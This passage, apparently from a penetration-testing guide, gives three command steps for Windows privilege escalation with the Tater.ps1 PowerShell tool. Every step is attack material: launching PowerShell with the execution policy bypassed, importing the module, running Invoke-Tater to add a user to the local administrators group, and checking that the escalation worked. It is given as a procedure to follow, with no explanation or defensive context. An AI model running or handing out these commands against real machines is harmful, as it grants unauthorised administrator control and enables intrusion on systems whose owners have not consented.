
1. **Import Tater.ps1:**
   ```plaintext
   powershell.exe -nop -ep bypass
   Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1
   ```

2. **Execute Exploit:**
   ```plaintext
   Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
   ```

3. **Verify:**
   ```plaintext
   net localgroup administrators
   ```
